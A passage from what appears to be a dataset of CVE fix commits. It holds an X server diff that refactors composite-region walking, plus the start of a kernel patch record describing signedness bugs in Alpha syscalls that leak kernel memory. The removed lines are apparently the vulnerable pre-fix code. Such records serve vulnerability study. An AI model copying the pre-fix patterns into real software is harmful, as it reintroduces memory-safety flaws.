x_src, y_src, x_dst, y_dst;\n+    \n+    xDst += pDst->pDrawable->x;\n+    yDst += pDst->pDrawable->y;\n+    if (pSrc->pDrawable)\n+    {\n+        xSrc += pSrc->pDrawable->x;\n+        ySrc += pSrc->pDrawable->y;\n+    }\n+    if (pMask && pMask->pDrawable)\n+    {\n+\txMask += pMask->pDrawable->x;\n+\tyMask += pMask->pDrawable->y;\n+    }\n+\n+    if (!miComputeCompositeRegion (&region, pSrc, pMask, pDst, xSrc, ySrc,\n+\t\t\t\t   xMask, yMask, xDst, yDst, width, height))\n+        return;\n+\n+    n = REGION_NUM_RECTS (&region);\n+    pbox = REGION_RECTS (&region);\n+    while (n--)\n+    {\n+\th = pbox->y2 - pbox->y1;\n+\ty_src = pbox->y1 - yDst + ySrc;\n+\ty_msk = pbox->y1 - yDst + yMask;\n+\ty_dst = pbox->y1;\n+\twhile (h)\n+\t{\n+\t    h_this = h;\n+\t    w = pbox->x2 - pbox->x1;\n+\t    x_src = pbox->x1 - xDst + xSrc;\n+\t    x_msk = pbox->x1 - xDst + xMask;\n+\t    x_dst = pbox->x1;\n+\t    if (maskRepeat)\n+\t    {\n+\t\ty_msk = mod (y_msk - pMask->pDrawable->y, pMask->pDrawable->height);\n+\t\tif (h_this > pMask->pDrawable->height - y_msk)\n+\t\t    h_this = pMask->pDrawable->height - y_msk;\n+\t\ty_msk += pMask->pDrawable->y;\n+\t    }\n+\t    if (srcRepeat)\n+\t    {\n+\t\ty_src = mod (y_src - pSrc->pDrawable->y, pSrc->pDrawable->height);\n+\t\tif (h_this > pSrc->pDrawable->height - y_src)\n+\t\t    h_this = pSrc->pDrawable->height - y_src;\n+\t\ty_src += pSrc->pDrawable->y;\n+\t    }\n+\t    while (w)\n+\t    {\n+\t\tw_this = w;\n+\t\tif (maskRepeat)\n+\t\t{\n+\t\t    x_msk = mod (x_msk - pMask->pDrawable->x, pMask->pDrawable->width);\n+\t\t    if (w_this > pMask->pDrawable->width - x_msk)\n+\t\t\tw_this = pMask->pDrawable->width - x_msk;\n+\t\t    x_msk += pMask->pDrawable->x;\n+\t\t}\n+\t\tif (srcRepeat)\n+\t\t{\n+\t\t    x_src = mod (x_src - pSrc->pDrawable->x, pSrc->pDrawable->width);\n+\t\t    if (w_this > pSrc->pDrawable->width - x_src)\n+\t\t\tw_this = pSrc->pDrawable->width - x_src;\n+\t\t    x_src += pSrc->pDrawable->x;\n+\t\t}\n+\t\t(*compositeRect) (op, pSrc, pMask, pDst,\n+\t\t\t\t  x_src, y_src, x_msk, y_msk, x_dst, y_dst,\n+\t\t\t\t  w_this, h_this);\n+\t\tw -= w_this;\n+\t\tx_src += w_this;\n+\t\tx_msk += w_this;\n+\t\tx_dst += w_this;\n+\t    }\n+\t    h -= h_this;\n+\t    y_src += h_this;\n+\t    y_msk += h_this;\n+\t    y_dst += h_this;\n+\t}\n+\tpbox++;\n+    }\n+    REGION_UNINIT (pDst->pDrawable->pScreen, &region);\n+}\n+\n+void\n fbComposite (CARD8      op,\n \t     PicturePtr pSrc,\n \t     PicturePtr pMask,\n@@ -1491,10 +1582,6 @@ fbComposite (CARD8      op,\n \t     CARD16     width,\n \t     CARD16     height)\n {\n-    RegionRec\t    region;\n-    int\t\t    n;\n-    BoxPtr\t    pbox;\n-    CompositeFunc   func = NULL;\n     Bool\t    srcRepeat = pSrc->pDrawable && pSrc->repeatType == RepeatNormal;\n     Bool\t    maskRepeat = FALSE;\n     Bool\t    srcTransform = pSrc->transform != 0;\n@@ -1502,8 +1589,7 @@ fbComposite (CARD8      op,\n     Bool\t    srcAlphaMap = pSrc->alphaMap != 0;\n     Bool\t    maskAlphaMap = FALSE;\n     Bool\t    dstAlphaMap = pDst->alphaMap != 0;\n-    int\t\t    x_msk, y_msk, x_src, y_src, x_dst, y_dst;\n-    int\t\t    w, h, w_this, h_this;\n+    CompositeFunc   func = NULL;\n \n #ifdef USE_MMX\n     static Bool mmx_setup = FALSE;\n@@ -1513,13 +1599,6 @@ fbComposite (CARD8      op,\n     }\n #endif\n \n-    xDst += pDst->pDrawable->x;\n-    yDst += pDst->pDrawable->y;\n-    if (pSrc->pDrawable) {\n-        xSrc += pSrc->pDrawable->x;\n-        ySrc += pSrc->pDrawable->y;\n-    }\n-\n     if (srcRepeat && srcTransform &&\n \tpSrc->pDrawable->width == 1 &&\n \tpSrc->pDrawable->height == 1)\n@@ -1527,8 +1606,6 @@ fbComposite (CARD8      op,\n     \n     if (pMask && pMask->pDrawable)\n     {\n-\txMask += pMask->pDrawable->x;\n-\tyMask += pMask->pDrawable->y;\n \tmaskRepeat = pMask->repeatType == RepeatNormal;\n \n \tif (pMask->filter == PictFilterConvolution)\n@@ -1688,7 +1765,8 @@ fbComposite (CARD8      op,\n \t    else if (!srcRepeat) \/* has mask and non-repeating source *\/\n \t    {\n \t\tif (pSrc->pDrawable == pMask->pDrawable &&\n-\t\t    xSrc == xMask && ySrc == yMask &&\n+\t\t    xSrc + pSrc->pDrawable->x == xMask + pMask->pDrawable->x &&\n+\t\t    ySrc + pSrc->pDrawable->y == yMask + pMask->pDrawable->y &&\n \t\t    !pMask->componentAlpha && !maskRepeat)\n \t\t{\n \t\t    \/* source == mask: non-premultiplied data *\/\n@@ -2091,73 +2169,10 @@ fbComposite (CARD8      op,\n \tsrcRepeat = FALSE;\n     if (maskTransform)\n \tmaskRepeat = FALSE;\n-    \n-    if (!miComputeCompositeRegion (&region, pSrc, pMask, pDst, xSrc, ySrc,\n-\t\t\t\t   xMask, yMask, xDst, yDst, width, height))\n-        return;\n \n-    n = REGION_NUM_RECTS (&region);\n-    pbox = REGION_RECTS (&region);\n-    while (n--)\n-    {\n-\th = pbox->y2 - pbox->y1;\n-\ty_src = pbox->y1 - yDst + ySrc;\n-\ty_msk = pbox->y1 - yDst + yMask;\n-\ty_dst = pbox->y1;\n-\twhile (h)\n-\t{\n-\t    h_this = h;\n-\t    w = pbox->x2 - pbox->x1;\n-\t    x_src = pbox->x1 - xDst + xSrc;\n-\t    x_msk = pbox->x1 - xDst + xMask;\n-\t    x_dst = pbox->x1;\n-\t    if (maskRepeat)\n-\t    {\n-\t\ty_msk = mod (y_msk - pMask->pDrawable->y, pMask->pDrawable->height);\n-\t\tif (h_this > pMask->pDrawable->height - y_msk)\n-\t\t    h_this = pMask->pDrawable->height - y_msk;\n-\t\ty_msk += pMask->pDrawable->y;\n-\t    }\n-\t    if (srcRepeat)\n-\t    {\n-\t\ty_src = mod (y_src - pSrc->pDrawable->y, pSrc->pDrawable->height);\n-\t\tif (h_this > pSrc->pDrawable->height - y_src)\n-\t\t    h_this = pSrc->pDrawable->height - y_src;\n-\t\ty_src += pSrc->pDrawable->y;\n-\t    }\n-\t    while (w)\n-\t    {\n-\t\tw_this = w;\n-\t\tif (maskRepeat)\n-\t\t{\n-\t\t    x_msk = mod (x_msk - pMask->pDrawable->x, pMask->pDrawable->width);\n-\t\t    if (w_this > pMask->pDrawable->width - x_msk)\n-\t\t\tw_this = pMask->pDrawable->width - x_msk;\n-\t\t    x_msk += pMask->pDrawable->x;\n-\t\t}\n-\t\tif (srcRepeat)\n-\t\t{\n-\t\t    x_src = mod (x_src - pSrc->pDrawable->x, pSrc->pDrawable->width);\n-\t\t    if (w_this > pSrc->pDrawable->width - x_src)\n-\t\t\tw_this = pSrc->pDrawable->width - x_src;\n-\t\t    x_src += pSrc->pDrawable->x;\n-\t\t}\n-\t\t(*func) (op, pSrc, pMask, pDst,\n-\t\t\t x_src, y_src, x_msk, y_msk, x_dst, y_dst,\n-\t\t\t w_this, h_this);\n-\t\tw -= w_this;\n-\t\tx_src += w_this;\n-\t\tx_msk += w_this;\n-\t\tx_dst += w_this;\n-\t    }\n-\t    h -= h_this;\n-\t    y_src += h_this;\n-\t    y_msk += h_this;\n-\t    y_dst += h_this;\n-\t}\n-\tpbox++;\n-    }\n-    REGION_UNINIT (pDst->pDrawable->pScreen, &region);\n+    fbWalkCompositeRegion (op, pSrc, pMask, pDst, xSrc, ySrc,\n+\t\t\t   xMask, yMask, xDst, yDst, width, height,\n+\t\t\t   srcRepeat, maskRepeat, func);\n }\n \n #endif \/* RENDER *\/\ndiff --git a\/fb\/fbpict.h b\/fb\/fbpict.h\nindex 86f271e..11cab3d 100644\n--- a\/fb\/fbpict.h\n+++ b\/fb\/fbpict.h\n@@ -630,6 +630,36 @@ fbComposite (CARD8      op,\n \t     CARD16     width,\n \t     CARD16     height);\n \n+typedef void\t(*CompositeFunc) (CARD8      op,\n+\t\t\t\t  PicturePtr pSrc,\n+\t\t\t\t  PicturePtr pMask,\n+\t\t\t\t  PicturePtr pDst,\n+\t\t\t\t  INT16      xSrc,\n+\t\t\t\t  INT16      ySrc,\n+\t\t\t\t  INT16      xMask,\n+                                  INT16      yMask,\n+\t\t\t\t  INT16      xDst,\n+\t\t\t\t  INT16      yDst,\n+\t\t\t\t  CARD16     width,\n+\t\t\t\t  CARD16     height);\n+\n+void\n+fbWalkCompositeRegion (CARD8 op,\n+\t\t       PicturePtr pSrc,\n+\t\t       PicturePtr pMask,\n+\t\t       PicturePtr pDst,\n+\t\t       INT16 xSrc,\n+\t\t       INT16 ySrc,\n+\t\t       INT16 xMask,\n+\t\t       INT16 yMask,\n+\t\t       INT16 xDst,\n+\t\t       INT16 yDst,\n+\t\t       CARD16 width,\n+\t\t       CARD16 height,\n+\t\t       Bool srcRepeat,\n+\t\t       Bool maskRepeat,\n+\t\t       CompositeFunc compositeRect);\n+\n \/* fbtrap.c *\/\n \n void\ndiff --git a\/miext\/rootless\/safeAlpha\/safeAlphaPicture.c b\/miext\/rootless\/safeAlpha\/safeAlphaPicture.c\nindex 6ccc05a..0ed2f3e 100644\n--- a\/miext\/rootless\/safeAlpha\/safeAlphaPicture.c\n+++ b\/miext\/rootless\/safeAlpha\/safeAlphaPicture.c\n@@ -46,22 +46,6 @@\n #include \"fbpict.h\"\n #include \"safeAlpha.h\"\n #include \"rootlessCommon.h\"\n-# define mod(a,b)\t((b) == 1 ? 0 : (a) >= 0 ? (a) % (b) : (b) - (-a) % (b))\n-\n-\n-typedef void\t(*CompositeFunc) (CARD8      op,\n-\t\t\t\t  PicturePtr pSrc,\n-\t\t\t\t  PicturePtr pMask,\n-\t\t\t\t  PicturePtr pDst,\n-\t\t\t\t  INT16      xSrc,\n-\t\t\t\t  INT16      ySrc,\n-\t\t\t\t  INT16      xMask,\n-                                  INT16      yMask,\n-\t\t\t\t  INT16      xDst,\n-\t\t\t\t  INT16      yDst,\n-\t\t\t\t  CARD16     width,\n-\t\t\t\t  CARD16     height);\n-\n \n \/* Optimized version of fbCompositeSolidMask_nx8x8888 *\/\n void\n@@ -148,46 +132,22 @@ SafeAlphaCompositeSolidMask_nx8x8888(\n }\n \n void\n-SafeAlphaComposite (CARD8      op,\n-    PicturePtr      pSrc,\n-    PicturePtr      pMask,\n-    PicturePtr      pDst,\n-    INT16           xSrc,\n-    INT16           ySrc,\n-    INT16           xMask,\n-    INT16           yMask,\n-    INT16           xDst,\n-    INT16           yDst,\n-    CARD16          width,\n-    CARD16          height)\n+SafeAlphaComposite (CARD8           op,\n+\t\t    PicturePtr      pSrc,\n+\t\t    PicturePtr      pMask,\n+\t\t    PicturePtr      pDst,\n+\t\t    INT16           xSrc,\n+\t\t    INT16           ySrc,\n+\t\t    INT16           xMask,\n+\t\t    INT16           yMask,\n+\t\t    INT16           xDst,\n+\t\t    INT16           yDst,\n+\t\t    CARD16          width,\n+\t\t    CARD16          height)\n {\n-    RegionRec\t    region;\n-    int\t\t    n;\n-    BoxPtr\t    pbox;\n-    CompositeFunc   func = 0;\n-    Bool\t    srcRepeat = pSrc->repeat;\n-    Bool\t    maskRepeat = FALSE;\n-    Bool            srcAlphaMap = pSrc->alphaMap != 0;\n-    Bool\t    maskAlphaMap = FALSE;\n-    Bool            dstAlphaMap = pDst->alphaMap != 0;\n-    int\t\t    x_msk, y_msk, x_src, y_src, x_dst, y_dst;\n-    int\t\t    w, h, w_this, h_this;\n-    int\t\t    dstDepth = pDst->pDrawable->depth;\n-    int\t\t    oldFormat = pDst->format;\n-\n-    xDst += pDst->pDrawable->x;\n-    yDst += pDst->pDrawable->y;\n-    xSrc += pSrc->pDrawable->x;\n-    ySrc += pSrc->pDrawable->y;\n-    if (pMask)\n-    {\n-\txMask += pMask->pDrawable->x;\n-\tyMask += pMask->pDrawable->y;\n-\tmaskRepeat = pMask->repeat;\n-\tmaskAlphaMap = pMask->alphaMap != 0;\n-    }\n-\n-\n+    int oldDepth = pDst->pDrawable->depth;\n+    int oldFormat = pDst->format;\n+    \n     \/*\n      * We can use the more optimized fbpict code, but it sets bits above\n      * the depth to zero. Temporarily adjust destination depth if needed.\n@@ -198,6 +158,7 @@ SafeAlphaComposite (CARD8      op,\n     {\n \tpDst->pDrawable->depth = 32;\n     }\n+    \n     \/* For rootless preserve the alpha in x8r8g8b8 which really is\n      * a8r8g8b8\n      *\/\n@@ -205,441 +166,34 @@ SafeAlphaComposite (CARD8      op,\n     {\n         pDst->format = PICT_a8r8g8b8;\n     }\n-\n-\n-\n-    if (!pSrc->transform && !(pMask && pMask->transform))\n-    if (!maskAlphaMap && !srcAlphaMap && !dstAlphaMap)\n-    switch (op) {\n-    case PictOpSrc:\n-#ifdef USE_MMX\n-\tif (!pMask && pSrc->format == pDst->format &&\n-\t    pSrc->pDrawable != pDst->pDrawable)\n-\t{\n-\t    func = fbCompositeCopyAreammx;\n-\t}\n-#endif\n-\tbreak;\n-    case PictOpOver:\n-\tif (pMask)\n-\t{\n-\t    if (srcRepeat && \n-\t\tpSrc->pDrawable->width == 1 &&\n-\t\tpSrc->pDrawable->height == 1)\n-\t    {\n-\t\tsrcRepeat = FALSE;\n-\t\tif (PICT_FORMAT_COLOR(pSrc->format)) {\n-\t\t    switch (pMask->format) {\n-\t\t    case PICT_a8:\n-\t\t\tswitch (pDst->format) {\n-\t\t\tcase PICT_r5g6b5:\n-\t\t\tcase PICT_b5g6r5:\n-#ifdef USE_MMX\n-\t\t\t    if (fbHaveMMX())\n-\t\t\t\tfunc = fbCompositeSolidMask_nx8x0565mmx;\n-\t\t\t    else\n-#endif\n-\t\t\t    func = fbCompositeSolidMask_nx8x0565;\n-\t\t\t    break;\n-\t\t\tcase PICT_r8g8b8:\n-\t\t\tcase PICT_b8g8r8:\n-\t\t\t    func = fbCompositeSolidMask_nx8x0888;\n-\t\t\t    break;\n-\t\t\tcase PICT_a8r8g8b8:\n-\t\t\tcase PICT_x8r8g8b8:\n-\t\t\tcase PICT_a8b8g8r8:\n-\t\t\tcase PICT_x8b8g8r8:\n-\t\t\t    func = SafeAlphaCompositeSolidMask_nx8x8888;\n-\t\t\t    break;\n-\t\t\t}\n-\t\t\tbreak;\n-\t\t    case PICT_a8r8g8b8:\n-\t\t\tif (pMask->componentAlpha) {\n-\t\t\t    switch (pDst->format) {\n-\t\t\t    case PICT_a8r8g8b8:\n-\t\t\t    case PICT_x8r8g8b8:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSolidMask_nx8888x8888Cmmx;\n-\t\t\t\telse\n-#endif\n-\t\t\t\tfunc = fbCompositeSolidMask_nx8888x8888C;\n-\t\t\t\tbreak;\n-\t\t\t    case PICT_r5g6b5:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSolidMask_nx8888x0565Cmmx;\n-\t\t\t\telse\n-#endif\n-\t\t\t\tfunc = fbCompositeSolidMask_nx8888x0565C;\n-\t\t\t\tbreak;\n-\t\t\t    }\n-\t\t\t}\n-\t\t\tbreak;\n-\t\t    case PICT_a8b8g8r8:\n-\t\t\tif (pMask->componentAlpha) {\n-\t\t\t    switch (pDst->format) {\n-\t\t\t    case PICT_a8b8g8r8:\n-\t\t\t    case PICT_x8b8g8r8:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSolidMask_nx8888x8888Cmmx;\n-\t\t\t\telse\n-#endif\n-\t\t\t\tfunc = fbCompositeSolidMask_nx8888x8888C;\n-\t\t\t\tbreak;\n-\t\t\t    case PICT_b5g6r5:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSolidMask_nx8888x0565Cmmx;\n-\t\t\t\telse\n-#endif\n-\t\t\t\tfunc = fbCompositeSolidMask_nx8888x0565C;\n-\t\t\t\tbreak;\n-\t\t\t    }\n-\t\t\t}\n-\t\t\tbreak;\n-\t\t    case PICT_a1:\n-\t\t\tswitch (pDst->format) {\n-\t\t\tcase PICT_r5g6b5:\n-\t\t\tcase PICT_b5g6r5:\n-\t\t\tcase PICT_r8g8b8:\n-\t\t\tcase PICT_b8g8r8:\n-\t\t\tcase PICT_a8r8g8b8:\n-\t\t\tcase PICT_x8r8g8b8:\n-\t\t\tcase PICT_a8b8g8r8:\n-\t\t\tcase PICT_x8b8g8r8:\n-\t\t\t    func = fbCompositeSolidMask_nx1xn;\n-\t\t\t    break;\n-\t\t\t}\n-\t\t\tbreak;\n-\t\t    }\n-\t\t}\n-\t    }\n-\t    else \/* has mask and non-repeating source *\/\n-\t    {\n-\t\tif (pSrc->pDrawable == pMask->pDrawable &&\n-\t\t    xSrc == xMask && ySrc == yMask &&\n-\t\t    !pMask->componentAlpha)\n-\t\t{\n-\t\t    \/* source == mask: non-premultiplied data *\/\n-\t\t    switch (pSrc->format) {\n-\t\t    case PICT_x8b8g8r8:\n-\t\t\tswitch (pMask->format) {\n-\t\t\tcase PICT_a8r8g8b8:\n-\t\t\tcase PICT_a8b8g8r8:\n-\t\t\t    switch (pDst->format) {\n-\t\t\t    case PICT_a8r8g8b8:\n-\t\t\t    case PICT_x8r8g8b8:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSrc_8888RevNPx8888mmx;\n-#endif\n-\t\t\t\tbreak;\n-\t\t\t    case PICT_r5g6b5:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSrc_8888RevNPx0565mmx;\n-#endif\n-\t\t\t\tbreak;\n-\t\t\t    }\n-\t\t\t    break;\n-\t\t\t}\n-\t\t\tbreak;\n-\t\t    case PICT_x8r8g8b8:\n-\t\t\tswitch (pMask->format) {\n-\t\t\tcase PICT_a8r8g8b8:\n-\t\t\tcase PICT_a8b8g8r8:\n-\t\t\t    switch (pDst->format) {\n-\t\t\t    case PICT_a8b8g8r8:\n-\t\t\t    case PICT_x8b8g8r8:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSrc_8888RevNPx8888mmx;\n-#endif\n-\t\t\t\tbreak;\n-\t\t\t    case PICT_r5g6b5:\n-#ifdef USE_MMX\n-\t\t\t\tif (fbHaveMMX())\n-\t\t\t\t    func = fbCompositeSrc_8888RevNPx0565mmx;\n-#endif\n-\t\t\t\tbreak;\n-\t\t\t    }\n-\t\t\t    break;\n-\t\t\t}\n-\t\t\tbreak;\n-\t\t    }\n-\t\t    break;\n-\t}\n-\telse\n-\t{\n-\t\t    \/* non-repeating source, repeating mask => translucent window *\/\n-\t\t    if (maskRepeat &&\n-\t\t\tpMask->pDrawable->width == 1 &&\n-\t\t\tpMask->pDrawable->height == 1)\n-\t\t    {\n-\t\t\tif (pSrc->format == PICT_x8r8g8b8 &&\n-\t\t\t    pDst->format == PICT_x8r8g8b8 &&\n-\t\t\t    pMask->format == PICT_a8)\n-\t\t\t{\n-#ifdef USE_MMX\n-\t\t\t    if (fbHaveMMX())\n-\t\t\t\tfunc = fbCompositeSrc_8888x8x8888mmx;\n-#endif\n-\t\t\t}\n-\t\t    }\n-\t\t}\n-\t    }\n-\t}\n-\telse \/* no mask *\/\n-\t{\n-\t    if (srcRepeat &&\n-\t\tpSrc->pDrawable->width == 1 &&\n-\t\tpSrc->pDrawable->height == 1)\n-\t    {\n-\t\t\/* no mask and repeating source *\/\n-\t    switch (pSrc->format) {\n-\t    case PICT_a8r8g8b8:\n-\t\t    switch (pDst->format) {\n-\t\t    case PICT_a8r8g8b8:\n-\t    case PICT_x8r8g8b8:\n-#ifdef USE_MMX\n-\t\t\tif (fbHaveMMX())\n-\t\t\t{\n-\t\t\t    srcRepeat = FALSE;\n-\t\t\t    func = fbCompositeSolid_nx8888mmx;\n-\t\t\t}\n-#endif\n-\t\t\tbreak;\n-\t\t    case PICT_r5g6b5:\n-#ifdef USE_MMX\n-\t\t\tif (fbHaveMMX())\n-\t\t\t{\n-\t\t\t    srcRepeat = FALSE;\n-\t\t\t    func = fbCompositeSolid_nx0565mmx;\n-\t\t\t}\n-#endif\n-\t\t\tbreak;\n-\t\t    }\n-\t\t    break;\n-\t\t}\n-\t    }\n-\t    else\n-\t    {\n-\t\tswitch (pSrc->format) {\n-\t\tcase PICT_a8r8g8b8:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_a8r8g8b8:\n-\t\tcase PICT_x8r8g8b8:\n-#ifdef USE_MMX\n-\t\t\tif (fbHaveMMX())\n-\t\t\t    func = fbCompositeSrc_8888x8888mmx;\n-\t\t\telse\n-#endif\n-\t\t    func = fbCompositeSrc_8888x8888;\n-\t\t    break;\n-\t\tcase PICT_r8g8b8:\n-\t\t    func = fbCompositeSrc_8888x0888;\n-\t\t    break;\n-\t\tcase PICT_r5g6b5:\n-\t\t    func = fbCompositeSrc_8888x0565;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t\tcase PICT_x8r8g8b8:\n-\t\t    switch (pDst->format) {\n-\t\t    case PICT_a8r8g8b8:\n-\t\t    case PICT_x8r8g8b8:\n-#ifdef USE_MMX\n-\t\t\tif (fbHaveMMX())\n-\t\t\t    func = fbCompositeCopyAreammx;\n-#endif\n-\t\t\tbreak;\n-\t\t    }\n-\t\tcase PICT_x8b8g8r8:\n-\t\t    switch (pDst->format) {\n-\t    case PICT_a8b8g8r8:\n-\t    case PICT_x8b8g8r8:\n-#ifdef USE_MMX\n-\t\t\tif (fbHaveMMX())\n-\t\t\t    func = fbCompositeCopyAreammx;\n-#endif\n-\t\t\tbreak;\n-\t\t    }\n-\t\t    break;\n-\t\tcase PICT_a8b8g8r8:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_a8b8g8r8:\n-\t\tcase PICT_x8b8g8r8:\n-#ifdef USE_MMX\n-\t\t\tif (fbHaveMMX())\n-\t\t\t    func = fbCompositeSrc_8888x8888mmx;\n-\t\t\telse\n-#endif\n-\t\t    func = fbCompositeSrc_8888x8888;\n-\t\t    break;\n-\t\tcase PICT_b8g8r8:\n-\t\t    func = fbCompositeSrc_8888x0888;\n-\t\t    break;\n-\t\tcase PICT_b5g6r5:\n-\t\t    func = fbCompositeSrc_8888x0565;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t    case PICT_r5g6b5:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_r5g6b5:\n-\t\t    func = fbCompositeSrc_0565x0565;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t    case PICT_b5g6r5:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_b5g6r5:\n-\t\t    func = fbCompositeSrc_0565x0565;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t    }\n-\t}\n-\t}\n-\tbreak;\n-    case PictOpAdd:\n-\tif (pMask == 0)\n-\t{\n-\t    switch (pSrc->format) {\n-\t    case PICT_a8r8g8b8:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_a8r8g8b8:\n-#ifdef USE_MMX\n-\t\t    if (fbHaveMMX())\n-\t\t\tfunc = fbCompositeSrcAdd_8888x8888mmx;\n-\t\t    else\n-#endif\n-\t\t    func = fbCompositeSrcAdd_8888x8888;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t    case PICT_a8b8g8r8:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_a8b8g8r8:\n-#ifdef USE_MMX\n-\t\t    if (fbHaveMMX())\n-\t\t\tfunc = fbCompositeSrcAdd_8888x8888mmx;\n-\t\t    else\n-#endif\n-\t\t    func = fbCompositeSrcAdd_8888x8888;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t    case PICT_a8:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_a8:\n-#ifdef USE_MMX\n-\t\t    if (fbHaveMMX())\n-\t\t\tfunc = fbCompositeSrcAdd_8000x8000mmx;\n-\t\t    else\n-#endif\n-\t\t    func = fbCompositeSrcAdd_8000x8000;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t    case PICT_a1:\n-\t\tswitch (pDst->format) {\n-\t\tcase PICT_a1:\n-\t\t    func = fbCompositeSrcAdd_1000x1000;\n-\t\t    break;\n-\t\t}\n-\t\tbreak;\n-\t    }\n-\t}\n-\tbreak;\n-    }\n-\n-    if (!func) {\n-        \/* no fast path, use the general code *\/\n-        fbCompositeGeneral(op, pSrc, pMask, pDst, xSrc, ySrc, xMask, yMask, xDst, yDst, width, height);\n-        \/\/ Reset destination depth and format to their true value\n-        pDst->pDrawable->depth = dstDepth;\n-        pDst->format = oldFormat;\n-        return;\n+    \n+    if (pSrc->pDrawable && pMask->pDrawable &&\n+\t!pSrc->transform && !pMask->transform &&\n+\t!pSrc->alphaMap && !pMask->alphaMap &&\n+\t!pMask->repeat && !pMask->componentAlpha && !pDst->alphaMap &&\n+\tpMask->format == PICT_a8 &&\n+\tpSrc->repeatType == RepeatNormal && \n+\tpSrc->pDrawable->width == 1 &&\n+\tpSrc->pDrawable->height == 1 &&\n+\t(pDst->format == PICT_a8r8g8b8 ||\n+\t pDst->format == PICT_x8r8g8b8 ||\n+\t pDst->format == PICT_a8b8g8r8 ||\n+\t pDst->format == PICT_x8b8g8r8))\n+    {\n+\tfbWalkCompositeRegion (op, pSrc, pMask, pDst,\n+\t\t\t       xSrc, ySrc, xMask, yMask, xDst, yDst,\n+\t\t\t       width, height,\n+\t\t\t       TRUE \/* srcRepeat *\/,\n+\t\t\t       FALSE \/* maskRepeat *\/,\n+\t\t\t       SafeAlphaCompositeSolidMask_nx8x8888);\n     }\n-\n-    if (!miComputeCompositeRegion (&region,\n- \t\t\t\t   pSrc,\n- \t\t\t\t   pMask,\n- \t\t\t\t   pDst,\n- \t\t\t\t   xSrc,\n- \t\t\t\t   ySrc,\n- \t\t\t\t   xMask,\n- \t\t\t\t   yMask,\n- \t\t\t\t   xDst,\n- \t\t\t\t   yDst,\n- \t\t\t\t   width,\n-                                   height))\n-        return;\n-\n-    n = REGION_NUM_RECTS (&region);\n-    pbox = REGION_RECTS (&region);\n-    while (n--)\n+    else\n     {\n-\th = pbox->y2 - pbox->y1;\n-\ty_src = pbox->y1 - yDst + ySrc;\n-\ty_msk = pbox->y1 - yDst + yMask;\n-\ty_dst = pbox->y1;\n-\twhile (h)\n-\t{\n-\t    h_this = h;\n-\t    w = pbox->x2 - pbox->x1;\n-\t    x_src = pbox->x1 - xDst + xSrc;\n-\t    x_msk = pbox->x1 - xDst + xMask;\n-\t    x_dst = pbox->x1;\n-\t    if (maskRepeat)\n-\t    {\n-\t\ty_msk = mod (y_msk, pMask->pDrawable->height);\n-\t\tif (h_this > pMask->pDrawable->height - y_msk)\n-\t\t    h_this = pMask->pDrawable->height - y_msk;\n-\t    }\n-\t    if (srcRepeat)\n-\t    {\n-\t\ty_src = mod (y_src, pSrc->pDrawable->height);\n-\t\tif (h_this > pSrc->pDrawable->height - y_src)\n-\t\t    h_this = pSrc->pDrawable->height - y_src;\n-\t    }\n-\t    while (w)\n-\t    {\n-\t\tw_this = w;\n-\t\tif (maskRepeat)\n-\t\t{\n-\t\t    x_msk = mod (x_msk, pMask->pDrawable->width);\n-\t\t    if (w_this > pMask->pDrawable->width - x_msk)\n-\t\t\tw_this = pMask->pDrawable->width - x_msk;\n-\t\t}\n-\t\tif (srcRepeat)\n-\t\t{\n-\t\t    x_src = mod (x_src, pSrc->pDrawable->width);\n-\t\t    if (w_this > pSrc->pDrawable->width - x_src)\n-\t\t\tw_this = pSrc->pDrawable->width - x_src;\n-\t\t}\n-\t\t(*func) (op, pSrc, pMask, pDst,\n-\t\t\t x_src, y_src, x_msk, y_msk, x_dst, y_dst,\n-\t\t\t w_this, h_this);\n-\t\tw -= w_this;\n-\t\tx_src += w_this;\n-\t\tx_msk += w_this;\n-\t\tx_dst += w_this;\n-\t    }\n-\t    h -= h_this;\n-\t    y_src += h_this;\n-\t    y_msk += h_this;\n-\t    y_dst += h_this;\n-\t}\n-\tpbox++;\n+\tfbComposite (op, pSrc, pMask, pDst,\n+\t\t     xSrc, ySrc, xMask, yMask, xDst, yDst, width, height);\n     }\n-    REGION_UNINIT (pDst->pDrawable->pScreen, &region);\n \n-    \/\/ Reset destination depth\/format to its true value\n-    pDst->pDrawable->depth = dstDepth;\n+    pDst->pDrawable->depth = oldDepth;\n     pDst->format = oldFormat;\n }\n \n-- \ncgit v1.1\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-2210","CWE_ID":"189","category":"security","commit_id":"21c5977a836e399fc710ff2c5367845ed5c2527f","commit_message":"From 21c5977a836e399fc710ff2c5367845ed5c2527f Mon Sep 17 00:00:00 2001\nFrom: Dan Rosenberg <drosenberg@vsecurity.com>\nDate: Wed, 15 Jun 2011 15:09:01 -0700\nSubject: [PATCH] alpha: fix several security issues\n\nFix several security issues in Alpha-specific syscalls.  Untested, but\nmostly trivial.\n\n1. Signedness issue in osf_getdomainname allows copying out-of-bounds\nkernel memory to userland.\n\n2. Signedness issue in 